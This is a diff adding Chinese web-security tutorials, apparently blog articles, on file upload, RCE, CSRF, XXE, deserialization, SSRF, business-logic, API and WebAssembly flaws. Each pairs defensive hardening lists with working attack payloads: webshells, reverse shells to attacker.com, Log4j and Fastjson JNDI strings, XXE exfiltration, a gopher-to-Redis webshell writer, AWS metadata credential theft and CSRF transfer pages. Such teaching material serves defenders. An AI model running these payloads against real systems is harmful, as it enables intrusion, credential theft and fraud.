+\`\`\`php
+# 如果存在文件包含漏洞
+# 上传图片马：image.jpg 包含 <?php system($_GET['cmd']); ?>
+
+# 通过包含执行
+http://target.com/index.php?page=upload/image.jpg&cmd=whoami
+\`\`\`
+
+### 案例4：使用上传检测工具
+
+\`\`\`bash
+# 使用.upload-labs 靶场练习
+docker pull c0ny1/upload-labs
+docker run -d -p 8080:80 c0ny1/upload-labs
+
+# 使用文件上传绕过脚本
+python upload_bypass.py -u http://target.com/upload -f shell.php
+\`\`\`
+
+## 安全加固
+
+1. **白名单限制扩展名**：只允许上传明确允许的文件类型
+2. **重命名文件**：上传后使用随机文件名，不保留原始文件名
+3. **禁止执行权限**：上传目录设置为不可执行（Apache: RemoveHandler）
+4. **文件内容检测**：使用 getimagesize() 等检查文件真实内容
+5. **独立存储**：上传文件存储在独立域名/CDN，不在主站目录
+6. **文件大小限制**：限制上传文件大小，防止DoS
+7. **二次渲染**：使用图片处理库重新渲染图片，清除嵌入代码
+8. **WAF 拦截**：检测恶意文件上传请求
+    `
+  },
+  {
+    slug: 'rce-vulnerability',
+    title: '远程代码执行漏洞详解',
+    date: '2026-06-17',
+    category: 'websec',
+    subcategory: 'rce',
+    tags: ['Web安全', 'RCE', '命令执行'],
+    summary: '远程代码执行漏洞原理、利用方式和防御方案。',
+    content: `
+## 什么是 RCE
+
+RCE（Remote Code Execution）远程代码执行，攻击者可在目标服务器上执行任意命令或代码。
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 注入点发现 │───>│ 2. 命令注入   │───>│ 3. 代码执行   │───>│ 4. 权限维持   │
+│ 参数/函数调用  │    │ 拼接系统命令  │    │ 获取命令执行  │    │ 横向渗透     │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  用户输入传入命令      管道符/反引号         whoami/id            反弹Shell
+  危险函数调用         $()  换行符          cat /etc/passwd      写入Webshell
+\`\`\`
+
+## 常见触发场景
+
+### PHP 危险函数
+
+\`\`\`php
+system()        exec()          passthru()
+shell_exec()    popen()         proc_open()
+pcntl_exec()    eval()          assert()
+\`\`\`
+
+### Python 危险函数
+
+\`\`\`python
+os.system()     os.popen()      subprocess.call()
+exec()          eval()          __import__()
+\`\`\`
+
+## 命令注入技巧
+
+\`\`\`bash
+# 管道符
+; ls
+| ls
+|| ls
+&& ls
+
+# 反引号
+\`ls\`
+
+# $() 替换
+$(ls)
+
+# 换行符
+%0a ls
+
+# 空格绕过
+\${IFS}
+{cat,/etc/passwd}
+cat<>/etc/passwd
+\`\`\`
+
+## 实战案例
+
+### 案例1：ping 功能命令注入
+
+\`\`\`php
+// 后端代码
+<?php
+$host = $_GET['host'];
+$output = shell_exec("ping -c 4 " . $host);
+echo "<pre>$output</pre>";
+?>
+
+// 攻击
+http://target.com/ping.php?host=127.0.0.1;cat /etc/passwd
+http://target.com/ping.php?host=127.0.0.1|bash -i >& /dev/tcp/attacker.com/4444 0>&1
+\`\`\`
+
+### 案例2：反弹 Shell
+
+\`\`\`bash
+# Bash反弹Shell
+bash -i >& /dev/tcp/attacker.com/4444 0>&1
+
+# Python反弹Shell
+python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat
+nc -e /bin/sh attacker.com 4444
+\`\`\`
+
+### 案例3：Log4j RCE (CVE-2021-44228)
+
+\`\`\`bash
+# JNDI注入
+\${jndi:ldap://attacker.com:1389/Exploit}
+
+# 使用 JNDIExploit 启动恶意LDAP服务
+java -jar JNDIExploit.jar -i attacker.com
+
+# 触发漏洞
+curl -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/Command/whoami}" http://target.com/
+\`\`\`
+
+### 案例4：使用工具自动化检测
+
+\`\`\`bash
+# Commix - 命令注入自动化工具
+python commix.py --url="http://target.com/vuln.php?cmd=whoami"
+
+# 列出所有注入点
+python commix.py --url="http://target.com/vuln.php?cmd=whoami" --level=3
+
+# 获取交互Shell
+python commix.py --url="http://target.com/vuln.php?cmd=whoami" --os-cmd
+\`\`\`
+
+## 安全加固
+
+1. **避免调用危险函数**：不要将用户输入直接传入 system/exec 等函数
+2. **使用白名单**：对用户输入做严格白名单校验
+3. **使用参数列表**：使用 escapeshellarg() 或参数数组传递命令
+4. **最小权限运行**：Web 应用使用低权限用户运行
+5. **禁用危险函数**：通过 disable_functions 禁用不必要的系统函数
+6. **输入过滤**：过滤管道符、分号、反引号等 shell 特殊字符
+7. **使用沙箱**：在 Docker 容器或 chroot 环境中执行用户相关操作
+8. **WAF 拦截**：检测命令注入特征流量
+    `
+  },
+  {
+    slug: 'csrf-attack',
+    title: 'CSRF 跨站请求伪造详解',
+    date: '2026-06-16',
+    category: 'websec',
+    subcategory: 'csrf',
+    tags: ['Web安全', 'CSRF', '请求伪造'],
+    summary: 'CSRF 漏洞原理、攻击方式和防御方案。',
+    content: `
+## 什么是 CSRF
+
+CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导已登录用户在不知情的情况下执行非预期操作。
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 用户登录   │───>│ 2. 访问恶意页 │───>│ 3. 自动发请求 │───>│ 4. 操作执行   │
+│ 获取Cookie    │    │ 钓鱼/ XSS    │    │ 携带用户凭证  │    │ 转账/改密码   │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  浏览器保存Cookie      恶意页面/邮件        表单/JSON/AJAX      资金操作/账号操作
+  Session认证          iframe/图片标签       跨域请求自动携带     修改资料/删除数据
+\`\`\`
+
+## 常见攻击方式
+
+### 1. 表单自动提交
+
+\`\`\`html
+<!-- 恶意页面 -->
+<body onload="document.getElementById('csrf-form').submit()">
+<form id="csrf-form" action="https://target.com/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker_account">
+    <input type="hidden" name="amount" value="10000">
+</form>
+</body>
+\`\`\`
+
+### 2. 图片标签触发 GET 请求
+
+\`\`\`html
+<!-- 修改用户资料 -->
+<img src="https://target.com/api/user/update?email=attacker@evil.com" style="display:none">
+\`\`\`
+
+### 3. AJAX 请求
+
+\`\`\`javascript
+// 使用 XMLHttpRequest
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://target.com/api/transfer", true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.send(JSON.stringify({to: "attacker", amount: 10000}));
+
+// 使用 fetch API
+fetch("https://target.com/api/transfer", {
+    method: "POST",
+    credentials: "include",
+    body: JSON.stringify({to: "attacker", amount: 10000})
+});
+\`\`\`
+
+## 实战案例
+
+### 案例1：银行转账 CSRF
+
+\`\`\`html
+<!-- 攻击者构造的页面 -->
+<html>
+<body>
+<h1>恭喜你中奖了！</h1>
+<iframe style="display:none" src="https://bank.com/transfer?to=attacker&amount=50000&memo=prize"></iframe>
+</body>
+</html>
+\`\`\`
+
+### 案例2：修改管理员密码
+
+\`\`\`html
+<!-- 利用管理员点击 -->
+<form method="POST" action="https://admin.target.com/change-password">
+    <input type="hidden" name="new_password" value="hacked123">
+    <input type="hidden" name="confirm" value="hacked123">
+</form>
+<script>document.forms[0].submit();</script>
+\`\`\`
+
+### 案例3：CSRF Token 伪造检测
+
+\`\`\`python
+import requests
+
+# 检查是否存在CSRF Token
+session = requests.Session()
+r = session.get("https://target.com/transfer")
+
+# 检查表单中是否有隐藏的token字段
+from bs4 import BeautifulSoup
+soup = BeautifulSoup(r.text, 'html.parser')
+token_input = soup.find('input', {'name': 'csrf_token'})
+
+if token_input:
+    print(f"存在CSRF Token: {token_input['value']}")
+else:
+    print("不存在CSRF Token，可能存在CSRF漏洞")
+\`\`\`
+
+### 案例4：SameSite Cookie 绕过
+
+\`\`\`
+# 如果Cookie没有设置SameSite属性，可以跨站携带
+# Chrome 80+ 默认 SameSite=Lax
+
+# 绕过方式：
+# 1. 使用子域名
+# 2. 使用 top-level navigation (GET请求)
+# 3. 利用旧版浏览器
+\`\`\`
+
+## 安全加固
+
+1. **CSRF Token**：在表单中添加随机 Token，服务端验证
+2. **SameSite Cookie**：设置 Cookie 的 SameSite 属性为 Strict 或 Lax
+3. **Referer/Origin 校验**：验证请求来源是否合法
+4. **二次验证**：敏感操作（转账/改密码）要求输入密码或验证码
+5. **自定义请求头**：使用 XMLHttpRequest/Fetch 添加自定义头（如 X-CSRF-Token）
+6. **双重提交 Cookie**：将 Cookie 和请求参数中的 Token 比对
+7. **避免 GET 修改数据**：修改数据的操作使用 POST/PUT/DELETE
+8. **WAF 拦截**：检测 CSRF 攻击特征
+    `
+  },
+  {
+    slug: 'xxe-injection',
+    title: 'XXE 注入漏洞详解',
+    date: '2026-06-15',
+    category: 'websec',
+    subcategory: 'xxe',
+    tags: ['Web安全', 'XXE', 'XML注入'],
+    summary: 'XXE 漏洞原理、利用方式和防御方案。',
+    content: `
+## 什么是 XXE
+
+XXE（XML External Entity）XML 外部实体注入，当应用解析用户提供的 XML 数据时，未禁用外部实体定义，攻击者可读取服务器文件或执行 SSRF。
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 发现XML   │───>│ 2. 构造DTD    │───>│ 3. 注入实体   │───>│ 4. 数据回显   │
+│ 接口/解析点   │    │ 外部实体定义  │    │ file:///dict  │    │ 文件内容/RCE  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  XML上传/API接口       DOCTYPE声明         SYSTEM "file://"     /etc/passwd
+  SOAP/Feed解析        外部DTD引用         参数实体注入         SSRF/DoS
+\`\`\`
+
+## 常见利用方式
+
+### 1. 读取本地文件
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+\`\`\`
+
+### 2. 读取 Windows 文件
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
+\`\`\`
+
+### 3. SSRF 利用
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>&xxe;</root>
+\`\`\`
+
+### 4. 参数实体外带数据
+
+\`\`\`xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+
+# attacker.com/evil.dtd
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>">
+%param;
+\`\`\`
+
+### 5. DoS 攻击（Billion Laughs）
+
+\`\`\`xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<root>&lol4;</root>
+\`\`\`
+
+## 实战案例
+
+### 案例1：SVG 图片上传 XXE
+
+\`\`\`xml
+<!-- 上传恶意SVG文件 -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <text x="0" y="20" fill="black">&xxe;</text>
+</svg>
+\`\`\`
+
+### 案例2：SOAP 接口 XXE
+
+\`\`\`xml
+POST /api/soap HTTP/1.1
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <getUser>
+      <name>&xxe;</name>
+    </getUser>
+  </soap:Body>
+</soap:Envelope>
+\`\`\`
+
+### 案例3：使用 XXE Inject 工具
+
+\`\`\`bash
+# 检测XXE漏洞
+xxe-inject -u http://target.com/api/xml -d "name=test"
+
+# 读取文件
+xxe-inject -u http://target.com/api/xml -d "name=test" -r /etc/passwd
+
+# SSRF探测
+xxe-inject -u http://target.com/api/xml -d "name=test" -s http://internal-host/
+\`\`\`
+
+## 安全加固
+
+1. **禁用外部实体解析**：在 XML 解析器中禁用 DTD 和外部实体
+2. **使用 JSON 替代 XML**：优先使用 JSON 格式传输数据
+3. **输入验证**：对 XML 输入做白名单校验
+4. **使用安全的解析库**：如 lxml（Python）、libxml2（C）等
+5. **限制文件访问**：XML 解析器运行在最小权限环境中
+6. **WAF 拦截**：检测 XXE 攻击特征
+7. **升级依赖库**：及时修复已知 XXE 漏洞
+8. **日志审计**：记录 XML 解析异常
+    `
+  },
   {
     slug: 'deserialization',
     title: '反序列化漏洞详解',
@@ -1644,6 +4893,86 @@ class FileWriter {
 2. 使用白名单验证类
 3. 使用 JSON 替代原生序列化
 4. 升级依赖库
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 寻找入口   │───>│ 2. 分析类结构 │───>│ 3. 构造利用链 │───>│ 4. 代码执行   │
+│ unserialize等 │    │ 魔术方法/依赖 │    │ POP链拼接     │    │ RCE/文件读写  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  PHP/Java/Python       __destruct/          ysoserial           反弹Shell
+  .NET/Go               readObject          自定义payload       写入Webshell
+\`\`\`
+
+## 实战案例
+
+### 案例1：PHP 反序列化写入Webshell
+
+\`\`\`php
+<?php
+// 目标代码中存在以下类
+class FileWriter {
+    public $filename;
+    public $content;
+    public function __destruct() {
+        file_put_contents($this->filename, $this->content);
+    }
+}
+
+// 攻击者构造payload
+$payload = new FileWriter();
+$payload->filename = "/var/www/html/shell.php";
+$payload->content = "<?php system($_GET['cmd']); ?>";
+echo serialize($payload);
+// O:10:"FileWriter":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:7:"content";s:42:"<?php system($_GET['cmd']); ?>";}
+// 将此payload发送到目标接口
+\`\`\`
+
+### 案例2：Java Fastjson反序列化RCE
+
+\`\`\`json
+// 恶意JSON payload
+{
+    "@type": "com.sun.rowset.JdbcRowSetImpl",
+    "dataSourceName": "ldap://attacker.com:1389/Exploit",
+    "autoCommit": true
+}
+
+// 攻击者搭建恶意LDAP/RMI服务
+// java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8888/#Exploit
+\`\`\`
+
+### 案例3：Python pickle反序列化
+
+\`\`\`python
+import pickle
+import os
+
+# 构造恶意pickle
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+payload = pickle.dumps(Exploit())
+print(payload)
+
+# 发送到目标：将payload base64编码后提交
+import base64
+print(base64.b64encode(payload).decode())
+\`\`\`
+
+## 安全加固
+
+1. **禁用用户输入的反序列化**：永远不要对用户可控的数据直接反序列化
+2. **使用白名单验证类**：只允许反序列化特定的安全类
+3. **使用 JSON 替代原生序列化**：JSON 不会触发对象的魔术方法/析构函数
+4. **升级依赖库**：及时修复 Fastjson、Shiro、WebLogic 等已知漏洞
+5. **启用反序列化过滤器**：Java 使用 JEP 290 过滤器，PHP 使用 disable_classes
+6. **最小权限运行**：Web 应用使用低权限用户运行，限制 RCE 影响范围
+7. **WAF 拦截**：部署反序列化攻击特征的 WAF 规则
+8. **代码审计**：使用 SAST 工具扫描反序列化危险函数调用
     `
   },
   {
@@ -1738,6 +5067,95 @@ gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a
 2. 禁用不需要的协议（file://、gopher://）
 3. 禁止访问内网地址
 4. 使用网络层隔离
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 发现SSRF  │───>│ 2. 协议探测   │───>│ 3. 内网扫描   │───>│ 4. 横向渗透   │
+│ 接口存在      │    │ file/gopher  │    │ 发现内网服务  │    │ 获取敏感数据  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  图片URL参数         dict/gopher协议      Redis/MySQL/Web     元数据/配置文件
+  钩子URL参数         协议走私              FastCGI攻击         内网应用控制
+\`\`\`
+
+## 实战案例
+
+### 案例1：图片URL加载触发SSRF读取云元数据
+
+\`\`\`python
+import requests
+
+# 某网站有图片预览功能，参数为图片URL
+# 正常请求
+url = "https://target.com/api/preview?url=https://example.com/image.jpg"
+
+# SSRF - 读取AWS元数据
+url_ssrf = "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/"
+r = requests.get(url_ssrf)
+print(r.text)
+
+# 获取IAM角色凭证
+url_creds = "https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+r = requests.get(url_creds)
+role_name = r.text.strip()
+url_final = f"https://target.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+r = requests.get(url_final)
+print(r.json())  # 获取到 AWS AccessKey 和 SecretKey
+\`\`\`
+
+### 案例2：Gopher协议攻击内网Redis写入Webshell
+
+\`\`\`python
+import urllib.parse
+
+# 构造 Gopher payload 攻击 Redis
+# 目标：写入一句话木马到 web 目录
+payload = """*3\\r\\n$3\\r\\nset\\r\\n$1\\r\\n1\\r\\n$34\\r\\n\\n<?php eval($_POST['cmd']); ?>\\n\\n\\r\\n*4\\r\\n$6\\r\\nconfig\\r\\n$3\\r\\nset\\r\\n$3\\r\\ndir\\r\\n$13\\r\\n/var/www/html\\r\\n*4\\r\\n$6\\r\\nconfig\\r\\n$3\\r\\nset\\r\\n$10\\r\\ndbfilename\\r\\n$9\\r\\nshell.php\\r\\n*1\\r\\n$4\\r\\nsave\\r\\n"""
+
+encoded = urllib.parse.quote(payload, safe='')
+gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
+
+# 通过SSRF触发
+ssrf_url = f"https://target.com/api/preview?url={gopher_url}"
+requests.get(ssrf_url)
+\`\`\`
+
+### 案例3：利用SSRF探测内网存活主机
+
+\`\`\`python
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+def check_host(ip):
+    url = f"https://target.com/api/preview?url=http://{ip}:8080/"
+    try:
+        r = requests.get(url, timeout=3)
+        if r.status_code != 502:
+            return f"[+] {ip}:8080 存活 (Status: {r.status_code})"
+    except:
+        pass
+    return None
+
+# 扫描 C 段
+ips = [f"192.168.1.{i}" for i in range(1, 255)]
+with ThreadPoolExecutor(max_workers=20) as executor:
+    for result in executor.map(check_host, ips):
+        if result:
+            print(result)
+\`\`\`
+
+## 安全加固
+
+1. **白名单限制可访问的域名/IP**：只允许访问明确列出的目标地址
+2. **禁用不需要的协议**：只允许 http/https，禁用 file://、gopher://、dict://
+3. **禁止访问内网地址**：过滤 10.x、172.16-31.x、192.168.x、127.x 等内网段
+4. **使用网络层隔离**：Web 服务器与内网服务不在同一网段，使用 DMZ 架构
+5. **禁用重定向**：禁止 HTTP 302 重定向，防止通过重定向绕过白名单
+6. **云环境元数据保护**：启用 IMDSv2，限制 169.254.169.254 访问
+7. **DNS Rebinding 防护**：验证解析后的 IP 是否在白名单内
+8. **日志审计**：记录所有出站请求，监控异常访问模式
     `
   },
   {
@@ -1850,6 +5268,108 @@ callback=http://attacker.com/steal
 3. 关键操作二次验证
 4. 限制请求频率
 5. 使用签名防篡改
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 接口发现   │───>│ 2. 逻辑分析   │───>│ 3. 参数篡改   │───>│ 4. 业务绕过   │
+│ 枚举所有端点  │    │ 梳理业务流程  │    │ 修改关键参数  │    │ 获得非法利益  │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  BurpSuite抓包        状态机分析           IDOR/竞态条件        越权/免支付
+  API文档探测          流程图绘制           类型混淆             重复使用优惠
+\`\`\`
+
+## 实战案例
+
+### 案例1：支付金额篡改
+
+\`\`\`http
+# 正常购买请求
+POST /api/order/create HTTP/1.1
+Content-Type: application/json
+
+{
+  "product_id": "P001",
+  "quantity": 1,
+  "price": 9900,
+  "coupon_id": "COUPON001"
+}
+
+# 篡改：修改价格为0.01元，数量改为-1
+{
+  "product_id": "P001",
+  "quantity": -1,
+  "price": 0.01,
+  "coupon_id": "COUPON001"
+}
+
+# 结果：负数数量+低价 = 反向扣款，获得退款
+\`\`\`
+
+### 案例2：并发竞态条件 - 优惠券重复使用
+
+\`\`\`python
+import threading
+import requests
+
+# 同时发送10个使用同一优惠券的请求
+def use_coupon():
+    r = requests.post("https://target.com/api/coupon/use",
+        json={"coupon_id": "COUPON001"},
+        headers={"Authorization": "Bearer <token>"})
+    print(r.json())
+
+threads = [threading.Thread(target=use_coupon) for _ in range(10)]
+for t in threads:
+    t.start()
+for t in threads:
+    t.join()
+# 结果：同一优惠券被使用10次
+\`\`\`
+
+### 案例3：密码重置逻辑绕过
+
+\`\`\`http
+# 步骤1：请求发送验证码
+POST /api/password/reset/send
+{"phone": "13800138000"}
+
+# 步骤2：提交重置请求（篡改接收手机号）
+POST /api/password/reset/confirm
+{
+  "phone": "13800138000",       # 发送验证码的手机号
+  "code": "123456",             # 收到的验证码
+  "target_phone": "13900139000", # 实际修改密码的手机号
+  "new_password": "hacked123"
+}
+# 结果：修改了别人的密码
+\`\`\`
+
+### 案例4：水平越权 - 个人信息遍历
+
+\`\`\`bash
+# 正常接口
+GET /api/user/profile/1001
+Authorization: Bearer <token_of_user_1001>
+
+# 遍历其他用户
+for i in $(seq 1000 2000); do
+    curl -s -H "Authorization: Bearer <token>" "https://target.com/api/user/profile/$i"
+done | grep -v "403|404"
+\`\`\`
+
+## 安全加固
+
+1. **服务端校验所有参数**：价格、数量、权限等关键字段必须在服务端验证，不能信任前端
+2. **使用不可预测的ID**：订单号、用户ID 等使用 UUID 替代自增 ID
+3. **关键操作二次验证**：支付、修改密码等操作需要二次确认（短信/邮箱验证码）
+4. **限制请求频率**：对敏感接口（登录、注册、重置密码）实施速率限制
+5. **使用签名防篡改**：对关键参数做 HMAC 签名，服务端验证完整性
+6. **数据库层加锁**：对并发操作使用数据库事务和行级锁（SELECT FOR UPDATE）
+7. **权限绑定**：操作与当前会话用户绑定，拒绝跨用户请求
+8. **审计日志**：记录所有关键操作，定期审计异常行为
     `
   },
   {
@@ -1986,14 +5506,110 @@ jwt_tool token.txt
 hashcat -m 16500 jwt.txt wordlist.txt
 \`\`\`
 
-## 防御方案
+## API 攻击流程
 
-1. 实施认证和授权
-2. 输入验证
-3. 速率限制
-4. 日志监控
-5. 使用 HTTPS
-6. API 网关
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. API枚举    │───>│ 2. 认证测试   │───>│ 3. 参数篡改   │───>│ 4. 漏洞利用   │
+│ 发现接口端点  │    │ 绕过/伪造Token│    │ 越权/注入     │    │ 数据泄露/RCE │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  Swagger/OpenAPI     JWT伪造/None       IDOR/批量赋值        SQLi/SSRF/RCE
+  路由爆破            Session伪造        参数污染             未授权访问
+\`\`\`
+
+## 实战案例
+
+### 案例1：IDOR 越权访问
+
+\`\`\`bash
+# 正常请求 - 用户A查看自己的订单
+GET /api/v1/orders/1001
+Authorization: Bearer <user_a_token>
+
+# 篡改订单号 - 查看用户B的订单
+GET /api/v1/orders/1002
+Authorization: Bearer <user_a_token>
+
+# 批量遍历 - 获取所有订单
+for i in $(seq 1 10000); do
+    curl -s -H "Authorization: Bearer <token>" "https://api.target.com/v1/orders/$i"
+done
+\`\`\`
+
+### 案例2：GraphQL 批量查询 DoS
+
+\`\`\`graphql
+# 构造深层嵌套查询导致服务器资源耗尽
+{
+  user(id: "1") {
+    friends {
+      friends {
+        friends {
+          friends {
+            name
+            posts {
+              comments {
+                author { name }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+# 使用工具自动化
+# pip install graphql-batch-query
+# graphql-batch -u http://target.com/graphql -q query.graphql -c 50
+\`\`\`
+
+### 案例3：JWT alg:none 绕过
+
+\`\`\`python
+import jwt
+import base64
+import json
+
+# 原始JWT
+token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature"
+
+# 篡改header为none
+header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).rstrip(b'=')
+forged = header.decode() + "." + payload.decode() + "."
+print(forged)
+\`\`\`
+
+### 案例4：速率限制绕过
+
+\`\`\`bash
+# 使用不同 IP 绕过
+for ip in 1.1.1.{1..100}; do
+    curl -H "X-Forwarded-For: $ip" -H "Authorization: Bearer <token>" "https://api.target.com/v1/admin"
+done
+
+# 使用不同 User-Agent
+curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS)" "https://api.target.com/v1/admin"
+curl -A "Mozilla/5.0 (Linux; Android)" "https://api.target.com/v1/admin"
+
+# 使用 HTTP/2 绕过
+curl --http2 "https://api.target.com/v1/admin"
+\`\`\`
+
+## 安全加固
+
+1. **实施认证和授权**：所有 API 必须经过认证，使用 OAuth 2.0 或 JWT（强密钥）
+2. **输入验证和输出编码**：对所有参数做类型、范围、格式校验
+3. **速率限制和配额**：按用户/IP/接口设置多级限流，结合 CAPTCHA
+4. **日志监控和告警**：记录所有 API 调用，设置异常行为告警规则
+5. **使用 HTTPS**：全站 HTTPS，启用 HSTS
+6. **API 网关**：统一鉴权、限流、日志、WAF
+7. **防止批量赋值**：使用 DTO 对象接收参数，只绑定允许的字段
+8. **JWT 安全**：使用 RS256 签名算法，设置合理过期时间，禁止 alg:none
+9. **GraphQL 限制**：禁用内省查询（生产环境），限制查询深度和复杂度
+10. **CORS 严格配置**：禁止 \`Access-Control-Allow-Origin: *\`，指定可信域名
     `
   },
   {
@@ -2085,6 +5701,81 @@ exports.targetFunction = function(...args) {
     return result;
 };
 \`\`\`
+
+## 攻击流程
+
+\`\`\`
+┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
+│ 1. 定位WASM  │───>│ 2. 反编译分析 │───>│ 3. 理解关键   │───>│ 4. Hook或调用 │
+│ 文件入口      │    │ 导出函数逻辑  │    │ 算法/验证逻辑 │    │ 导出函数      │
+└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+       │                   │                   │                    │
+  浏览器网络面板     wasm-decompile       伪C代码/Ghidra      JS交互脚本
+  Sources面板       wasm-objdump         IDA Pro/Binja       Frida注入
+\`\`\`
+
+## 实战案例
+
+### 案例1：电商价格校验绕过
+
+某电商平台使用 WASM 校验订单价格，防止前端篡改：
+
+\`\`\`javascript
+// 反编译后的 WASM 伪C代码
+int verify_price(int item_id, int quantity, int price) {
+    int expected = get_server_price(item_id) * quantity;
+    if (price == expected) {
+        return 1;  // 验证通过
+    }
+    return 0;  // 价格异常
+}
+
+// 攻击方式：Hook 导出函数强制返回 1
+const exports = wasmInstance.exports;
+const originalVerify = exports.verify_price;
+exports.verify_price = function(itemId, quantity, price) {
+    console.log("绕过价格校验:", itemId, quantity, price);
+    return 1;  // 直接返回验证通过
+};
+\`\`\`
+
+### 案例2：游戏反作弊逻辑分析
+
+\`\`\`javascript
+// WASM 中的反作弊校验被反编译为：
+// bool check_memory_valid(uintptr_t addr, size_t len) {
+//     // 检查内存地址是否在合法范围内
+//     return addr >= HEAP_START && addr + len <= HEAP_END;
+// }
+
+// Hook绕过
+exports.check_memory_valid = function(addr, len) {
+    return true;  // 绕过内存校验
+};
+\`\`\`
+
+### 案例3：使用 Ghidra 分析 WASM 二进制
+
+\`\`\`bash
+# 1. 提取 WASM 文件
+# Chrome DevTools → Sources → 找到.wasm文件 → 右键 Save
+
+# 2. 使用 Ghidra 导入分析
+# File → Import File → 选择.wasm → WebAssembly 架构
+
+# 3. 在函数列表中搜索关键词（如 check, verify, valid）
+
+# 4. 查看反编译结果，理解校验逻辑
+\`\`\`
+
+## 安全加固
+
+1. **关键逻辑不要只放前端**：WASM 可被反编译，敏感校验必须在服务端完成
+2. **增加服务端二次校验**：即使前端通过 WASM 校验，服务端也要独立验证
+3. **使用代码混淆**：使用 wasm-opt 的混淆选项增加逆向难度
+4. **添加完整性校验**：对 WASM 文件做哈希校验，防止被替换
+5. **避免在 WASM 中硬编码密钥**：密钥可被提取，应使用服务端下发
+6. **结合 CSP 策略**：限制 WASM 的加载来源
     `
   },
   // 移动端安全
